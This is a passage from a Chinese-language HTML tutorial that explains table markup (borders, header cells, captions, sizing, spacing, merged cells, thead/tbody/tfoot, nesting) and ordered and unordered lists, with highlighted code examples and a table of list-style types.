title="18.1.1边框（border）"></a>18.1.1边框（border）</h4><p>如果不定义边框属性，表格将不显示边框。如果我们希望显示边框，使用边框属性border来显示一个带有边框的表格。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-2表头单元格（-lt-th-gt-）"><a href="#18-1-2表头单元格（-lt-th-gt-）" class="headerlink" title="18.1.2表头单元格（&lt;th&gt;）"></a>18.1.2表头单元格（&lt;th&gt;）</h4><p>表格的表头单元格使用&lt;th&gt;标签进行定义。表格的表头单元格属性主要是一些公共属性，如：align、dir、width、height。大多数浏览器会把表头显示为粗体居中的文本。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Header 1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Header 2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-3表格标题（-lt-caption-gt-）"><a href="#18-1-3表格标题（-lt-caption-gt-）" class="headerlink" title="18.1.3表格标题（&lt;caption&gt;）"></a>18.1.3表格标题（&lt;caption&gt;）</h4><p>　在&lt;table&gt;标签中我们可以使用&lt;caption&gt; … &lt;/ caption&gt;标签作为标题，并在表的顶部显示出来。<br>　<strong>但需要注意的是：此标签在较新版本的HTML / XHTML中已弃用</strong></p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">caption</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">caption</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, column 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, columnn 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>         <br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, column 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, columnn 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-4表格高度和宽度"><a href="#18-1-4表格高度和宽度" class="headerlink" title="18.1.4表格高度和宽度"></a>18.1.4表格高度和宽度</h4><p>在&lt;table&gt;标签中您可以使用width（宽）和height（高）属性设置表格宽度和高度。也可以按像素或可用屏幕区域的百分比来指定表格宽度或高度。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span> = <span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span> = <span class="hljs-string">&quot;150&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1, Column 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1, Column 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 2, Column 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 2, Column 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-5表格背景"><a href="#18-1-5表格背景" class="headerlink" title="18.1.5表格背景"></a>18.1.5表格背景</h4><p>可以使用以下方法之一设置 HTML 表格的背景 ：</p><blockquote><ul><li>bgcolor属性 ： 可以为整个表格或仅为一个单元格设置背景颜色。</li><li>background属性 ：可以为整个表设置背景图像或仅为一个单元设置背景图像。</li><li>bordercolor属性 ：可以设置边框颜色。</li></ul></blockquote><p><strong>注意的是：HTML5 中不推荐使用bgcolor，background和bordercolor属性。</strong></p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">bordercolor</span> = <span class="hljs-string">&quot;green&quot;</span> <span class="hljs-attr">background</span> = <span class="hljs-string">&quot;test.png&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 3<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-6表格间距"><a href="#18-1-6表格间距" class="headerlink" title="18.1.6表格间距"></a>18.1.6表格间距</h4><p>以下两个属性，用于调整 HTML 表格中单元格的空间：</p><blockquote><ul><li>cellspacing属性：定义表格单元格之间的空间 </li><li>cellpadding属性：表示单元格边框与单元格内容之间的距离</li></ul></blockquote><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">cellpadding</span> = <span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">cellspacing</span> = <span class="hljs-string">&quot;5&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Salary<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>其琛<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5000<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>曼迪<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>7000<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-7合并单元格"><a href="#18-1-7合并单元格" class="headerlink" title="18.1.7合并单元格"></a>18.1.7合并单元格</h4><p>可以将多行（或列）进行合并成一行。</p><blockquote><ul><li>如果要将两个或多个列合并为一个列，将使用colspan属性 。</li><li>如果要合并两行或更多行，则将使用rowspan属性。</li></ul></blockquote><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 3<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">rowspan</span> = <span class="hljs-string">&quot;2&quot;</span>&gt;</span>Row 1 Cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1 Cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1 Cell 3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 2 Cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 2 Cell 3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;3&quot;</span>&gt;</span>Row 3 Cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-8表格的头部、主体、页脚"><a href="#18-1-8表格的头部、主体、页脚" class="headerlink" title="18.1.8表格的头部、主体、页脚"></a>18.1.8表格的头部、主体、页脚</h4><p>表格可以分为三个部分 - 头部，主体和页脚，如同word 文档中页面的页眉、正文、页脚。每个页面保持相同，而正文是表格的主要内容持有者。<br>头部，主体和页脚的对应的三个标签是：</p><blockquote><ul><li>&lt;thead&gt; - 创建单独的表头。</li><li>&lt;tbody&gt; - 表示表格的主体。</li><li>&lt;tfoot&gt; - 创建一个单独的表页脚。</li></ul></blockquote><p>表可以包含多个&lt;tbody&gt;元素以指示不同的页面。<br><strong>但值得注意的是&lt;thead&gt;和&lt;tfoot&gt;标签应出现在&lt;tbody&gt;之前。</strong></p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span> = <span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;4&quot;</span>&gt;</span>This is the head of the table<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>       <br>    <span class="hljs-tag">&lt;<span class="hljs-name">tfoot</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;4&quot;</span>&gt;</span>This is the foot of the table<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tfoot</span>&gt;</span>     <br>    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Cell 3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Cell 4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>         <br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-9表格的嵌套"><a href="#18-1-9表格的嵌套" class="headerlink" title="18.1.9表格的嵌套"></a>18.1.9表格的嵌套</h4><p>可以在另一个表中使用一个表。可以使用&lt;table&gt;内的几乎所有标签。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span> = <span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span> = <span class="hljs-string">&quot;100%&quot;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Salary<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>其琛<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5000<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>曼迪<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>7000<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>           <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>       <br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="19-列表"><a href="#19-列表" class="headerlink" title="19.列表"></a>19.列表</h2><p>HTML 支持有序、无序和定义列表。<strong>列表项内部可以使用段落、换行符、图片、链接以及其他列表等等。</strong><br><strong>每个列表项始于 &lt;li&gt; 标签。</strong></p><h3 id="19-1无序列表（-lt-ul-gt-）"><a href="#19-1无序列表（-lt-ul-gt-）" class="headerlink" title="19.1无序列表（&lt;ul&gt;）"></a>19.1无序列表（&lt;ul&gt;）</h3><p>无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。<br>无序列表适合成员之间无级别顺序关系的情况。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;list-style-type:disc&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!--以小黑点表示--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Coffee<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Milk<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 将disc可以换成以下这些类型：</span><br><span class="hljs-comment">disc ----实心圆（默认）</span><br><span class="hljs-comment">circle ----空心圆</span><br><span class="hljs-comment">square ----实心方块</span><br><span class="hljs-comment">decimal ----以数字1开始表示</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></div></td></tr></table></figure><p>除去上面所写类型外，以下表格中的类型用在有序列表中是不正确的，在有序列表中使用时，会自动转化为默认的情况（即数字表示）。</p><table><thead><tr><th align="center">属性值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">none</td><td align="center">无标记。</td></tr><tr><td align="center">disc</td><td align="center">默认。标记是实心圆。</td></tr><tr><td align="center">circle</td><td align="center">标记是空心圆。</td></tr><tr><td align="center">square</td><td align="center">标记是实心方块。</td></tr><tr><td align="center">decimal</td><td align="center">标记是数字。</td></tr><tr><td align="center">decimal-leading-zero</td><td align="center">0开头的数字标记。(01, 02, 03, 等。)</td></tr><tr><td align="center">lower-roman</td><td align="center">小写罗马数字(i, ii, iii, iv, v, 等。)</td></tr><tr><td align="center">upper-roman</td><td align="center">大写罗马数字(I, II, III, IV, V, 等。)</td></tr><tr><td align="center">lower-alpha</td><td align="center">小写英文字母The marker is lower-alpha (a, b, c, d, e, 等。)</td></tr><tr><td align="center">upper-alpha</td><td align="center">大写英文字母The marker is upper-alpha (A, B, C, D, E, 等。)</td></tr><tr><td align="center">lower-greek</td><td align="center">小写希腊字母(alpha, beta, gamma, 等。)</td></tr><tr><td align="center">lower-latin</td><td align="center">小写拉丁字母(a, b, c, d, e, 等。)</td></tr><tr><td align="center">upper-latin</td><td align="center">大写拉丁字母(A, B, C, D, E, 等。)</td></tr><tr><td align="center">hebrew</td><td align="center">传统的希伯来编号方式</td></tr><tr><td align="center">armenian</td><td align="center">传统的亚美尼亚编号方式</td></tr><tr><td align="center">georgian</td><td align="center">传统的乔治亚编号方式(an, ban, gan, 等。)</td></tr><tr><td align="center">cjk-ideographic</td><td align="center">简单的表意数字</td></tr><tr><td align="center">hiragana</td><td align="center">标记是：a, i, u, e, o, ka, ki, 等。（日文平假名字符）</td></tr><tr><td align="center">katakana</td><td align="center">标记是：A, I, U, E, O, KA, KI, 等。（日文片假名字符）</td></tr><tr><td align="center">hiragana-iroha</td><td align="center">标记是：i, ro, ha, ni, ho, he, to, 等。（日文平假名序号）</td></tr><tr><td align="center">katakana-iroha</td><td align="center">标记是：I, RO, HA, NI, HO, HE, TO, 等。（日文片假名序号）</td></tr></tbody></table><h3 id="19-2有序列表（-lt-ol-gt-）"><a href="#19-2有序列表（-lt-ol-gt-）" class="headerlink" title="19.2有序列表（&lt;ol&gt;）"></a>19.2有序列表（&lt;ol&gt;）</h3><p>有序列表也是一列项目，列表项目使用数字进行标记。有序列表适合各项目之间存在顺序关系的情况。列表项项使用数字来标记。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;A&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!--不写类型 默认为数字从1开始--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Coffee<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>      <br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Milk<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>       <br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br><span class="hljs-comment">&lt;!--也可以是以下类型</span><br><span class="hljs-comment">A --- 表示以大写字母从A开始</span><br><span class="hljs-comment">a --- 表示以小写字母从a开始</span><br><span class="hljs-comment">I --- 表示以罗马数字从I开始</span><br><span class="hljs-comment">i --- 表示以罗马数字从i开始</span><br><span class="hljs-comment">⭐需要注意的是，若用非法的(不正确的)类型，会自动转化为默认类型（即从数字1表示）</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="19-3自定义列表（-lt-dl-gt-）"><a href="#19-3自定义列表（-lt-dl-gt-）" class="headerlink" title="19.3自定义列表（&lt;dl&gt;）"></a>19.3自定义列表（&lt;dl&gt;）</h3><p>自定义列表不仅仅是一列项目，而是项目及其注释的组合。<br><strong>自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt; 